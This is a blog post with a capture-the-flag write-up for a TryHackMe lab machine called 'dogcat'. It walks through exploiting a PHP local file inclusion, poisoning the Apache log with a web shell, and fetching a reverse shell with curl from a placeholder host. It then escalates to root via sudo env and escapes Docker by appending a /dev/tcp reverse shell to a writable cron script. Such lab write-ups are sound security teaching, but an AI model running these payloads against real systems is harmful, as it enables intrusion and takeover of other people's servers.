<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="Seif-Allah's Blog" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="Seif-Allah's Blog" /> <title> TryHackMe: Dogcat WriteUp - Seif-Allah's Blog </title> <link rel="alternate" href="http://localhost:4000/THM-dogcat/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/THM-dogcat/" /> <meta name="description" content="TryHackMe: WriteUp for the &#39;dogcat&#39; room (Level: Medium)" /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="TryHackMe: Dogcat WriteUp | Seif-Allah Homrani" /> <meta property="og:title" content="TryHackMe: Dogcat WriteUp | Seif-Allah Homrani" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/THM-dogcat/" /> <meta property="og:description" content="TryHackMe: WriteUp for the &#39;dogcat&#39; room (Level: Medium)" /> <meta property="og:image" content="http://localhost:4000/assets/images/writeups/thm/dogcat/dogcat.png" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="TryHackMe: Dogcat WriteUp | seifallah1" /> <meta name="twitter:url" content="http://localhost:4000/THM-dogcat/" /> <meta name="twitter:site" content="@seifallah1" /> <meta name="twitter:creator" content="@seifallah1" /> <meta name="twitter:description" content="TryHackMe: WriteUp for the &#39;dogcat&#39; room (Level: Medium)" /> <meta name="twitter:image" content="http://localhost:4000/assets/images/writeups/thm/dogcat/dogcat.png" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Seif-Allah's Blog" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a></div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <h1 class="header-title" itemprop="headline">TryHackMe: Dogcat WriteUp</h1> <div class="post-meta"> <time datetime="2020-11-14T00:00:00+01:00" itemprop="datePublished"> Nov 14, 2020 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">Seif-Allah Homrani</span> </span> <time hidden datetime="" itemprop="dateModified"> Nov 14, 2020 </time> <span hidden itemprop="publisher" itemtype="Person">Seif-Allah Homrani</span> <span hidden itemprop="image">/assets/images/writeups/thm/dogcat/dogcat.png</span> <span hidden itemprop="mainEntityOfPage"><p>Link : <a href="https://tryhackme.com/room/dogcat">dogcat room</a></p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <p>Link : <a href="https://tryhackme.com/room/dogcat">dogcat room</a></p> <p>Welcome, Welcome, Welcome and welcome !</p> <h3 id="introduction"> <a href="#introduction" class="anchor-head"></a> Introduction </h3> <p>After finishing <a href="">lfi basics room</a>, and learning some new lfi stuff, I chose this room to practice my new skill, and I absolutely recommend it!</p> <h3 id="enumeration"> <a href="#enumeration" class="anchor-head"></a> Enumeration </h3> <hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s<span class="o">=</span>
|   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: dogcat
</code></pre></div></div> <p>Nothing fancy here, there’s a web server running on port 80, let’s check it!</p> <p><img src="/assets/images/writeups/thm/dogcat/homepage.png" alt="homepage" /></p> <p>Basically, it’s a web app that choose randomly a cat or a dog image based on user choice (images are stored inside a dog and cat folders - look at the source).</p> <p>The user choice (cat | dog) are passed to the server through the <em>view</em> variable (look at the url), so what if we enter something other than dog or cat ? for example <em>ls</em></p><hr /> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sorry, only dogs or cats are allowed.
</code></pre></div></div><hr /> <p>So only dogs or cats allowed ? lets try <em>dog;ls</em> ?</p><hr /> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: include(dog;ls.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'dog;ls.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
</code></pre></div></div> <p>humm ! so there’s an include function running inside the <em>/var/www/html/index.php</em> file that failed to open <em>days;ls.php</em> file.</p> <p>I think it’s time for some <a href="https://github.com/seifallahhomrani1/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-lfi">lfi</a> now !</p> <p>First things first, I used the null byte character : %00 The result was :</p><hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: include<span class="o">()</span>: Failed opening <span class="s1">'dog;ls'</span> <span class="k">for </span>inclusion <span class="o">(</span><span class="nv">include_path</span><span class="o">=</span><span class="s1">'.:/usr/local/lib/php'</span><span class="o">)</span> <span class="k">in</span> /var/www/html/index.php on line 24
</code></pre></div></div> <p>so we get rid of the first warning which means that :</p> <ul> <li>the program concatenate .php extension at the end of the input unless it’s dog or cat.</li> </ul> <p>Ok, let’s <em>directory traversal</em> :</p><hr /> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>“/?view=php://filter/read=convert.base64-encode/resource=./dog/../index”
Result after decoding : 

<span class="cp">&lt;!DOCTYPE HTML&gt;</span>
<span class="nt">&lt;html&gt;</span>

<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>dogcat<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/style.css"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>

<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h1&gt;</span>dogcat<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;i&gt;</span>a gallery of various dogs or cats<span class="nt">&lt;/i&gt;</span>

    <span class="nt">&lt;div&gt;</span>
        <span class="nt">&lt;h2&gt;</span>What would you like to see?<span class="nt">&lt;/h2&gt;</span>
        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/?view=dog"</span><span class="nt">&gt;&lt;button</span> <span class="na">id=</span><span class="s">"dog"</span><span class="nt">&gt;</span>A dog<span class="nt">&lt;/button&gt;&lt;/a&gt;</span> <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/?view=cat"</span><span class="nt">&gt;&lt;button</span> <span class="na">id=</span><span class="s">"cat"</span><span class="nt">&gt;</span>A cat<span class="nt">&lt;/button&gt;&lt;/a&gt;&lt;br&gt;</span>
        <span class="cp">&lt;?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
         &lt;!-- the site checks if ext variable is set, if not it assigns it .php   --&gt;
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>

<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <p>html comment is my explanation of the code.</p> <h3 id="lfi-to-rce-via-controlled-log-file"> <a href="#lfi-to-rce-via-controlled-log-file" class="anchor-head"></a> LFI to RCE via controlled log file </h3> <p>Like mentioned <a href="https://github.com/seifallahhomrani1/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-lfi">here</a>, I did a request to the server (in our case Apache) and include the log file (/var/log/apache2/access.log&amp;ext). Reading the log file, it looks like we can insert a php script inside the user agent header since it’s not manipulated(10.4.14.245 - - [14/Nov/2020:17:13:34 +0000] “GET / HTTP/1.1” 200 537 “-“ “Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0” 10.4.14.245 -), so I inserted this code :</p> <hr /> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span><span class="cp">?&gt;</span>
</code></pre></div></div><hr /> <p>and then started a web server on my local host to host a reverse shell file and used wget command to save it inside a temporary file to finally get a reverse shell !</p><hr /> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/?</span><span class="n">view</span><span class="o">=</span><span class="mf">.</span><span class="o">/</span><span class="n">dog</span><span class="o">/../../../../../../../</span><span class="k">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access</span><span class="mf">.</span><span class="n">log</span><span class="o">&amp;</span><span class="n">ext</span><span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">curl</span> <span class="n">http</span><span class="o">://</span><span class="no">MY</span><span class="o">-</span><span class="no">IP</span><span class="o">:</span><span class="mi">80</span><span class="o">/</span><span class="n">reverse</span><span class="mf">.</span><span class="n">php</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">reverse</span><span class="mf">.</span><span class="n">php</span>
</code></pre></div></div><hr /> <p>After that, I used chmod to make it executable and started a listener in my local host and running the file from the browser BOOM!! I got the reverse shell !</p><hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/thm/startup# nc <span class="nt">-nlvp</span> 1234
listening on <span class="o">[</span>any] 1234 ...
connect to <span class="o">[</span>10.4.14.245] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.129.131] 46518
Linux 571f0aa7aca9 4.15.0-96-generic <span class="c">#97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux</span>
 18:05:41 up 55 min,  0 <span class="nb">users</span>,  load average: 0.23, 0.11, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ 
</span></code></pre></div></div> <p>Spawning a tty shell using <em>/bin/bash -i</em> command, and looking at the user directory we can find the 2nd flag. The first flag was inside the <em>/var/www/html/</em> directory. (We could retrieve it by running view=flag in the url, anyway) Now we need to escalate our privileges.</p> <h3 id="privesc"> <a href="#privesc" class="anchor-head"></a> PrivEsc </h3> <p>Running sudo -l command, it looks like we can <em>env</em> as root, checking [gtfobins] as always and yeah we can escalate our privileges to root by running : <em>sudo env /bin/sh</em>, easy! We can now retrieve the 3rd flag from root directory.</p> <p>But now !! THE FUN BEGIN</p> <h3 id="breaking-docker-locker"> <a href="#breaking-docker-locker" class="anchor-head"></a> Breaking DOCKER LOCKER </h3> <p>The 4th flag was really hard to get for me, I didn’t face any of these kinda flags before but it was kinda fun to get it !</p> <p>By looking at this <a href="https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1">article</a> from the famous Vickie Lie, and the docker tag from the room cover, I check /proc/1/cgroup file to check if we are inside a docker container or not.</p> <p>So I manually enumerated the machine, looking for elements that could help me escape the container such as a script via the find / -type f -name *.sh command because nothing of the tricks found helped me, the first result is the file /opt/backups/backup.sh, hum interesting, looking at its contents :</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">tar </span>cf /root/container/backup/backup.tar /root/container
</code></pre></div></div> <p>From what it looks like, basically it’s a cronjob that backup the container, and since it’s writeable, let’s add a reverse shell, start a listener and wait for it to be executed.</p> <hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/1234 0&gt;&amp;1'"</span> <span class="o">&gt;&gt;</span> backup.sh
</code></pre></div></div><hr /> <p>After few minutes we get a reverse shell from the parent host and we can easily get flag4.txt !</p> <h3 id="final-thoughts"> <a href="#final-thoughts" class="anchor-head"></a> Final thoughts </h3> <p>This room rocks ! I absolutely recommend for all beginners like me ! Huge thanks to <a href="https://tryhackme.com/p/jammy">jammy</a> !</p> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/Placeholder-Image-Server-Adding-Caching/" > <div class="nav-arrow">Previous</div> <span class="post-title">Django - Placeholder Image Server : Adding Caching</span> </a> <a class="post-nav-item post-nav-next" href="/Java-OOP-concepts/"> <div class="nav-arrow">Next</div> <span class="post-title">Java - OOP Concepts</span> </a> </nav> <footer class="footer"> Made by <a href="https://github.com/seifallahhomrani1" target="_blank" rel="noreferrer noopener" >Seif-Allah</a> <span class="footer_item">&copy; 2021</span> <small class="footer_copyright"> </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
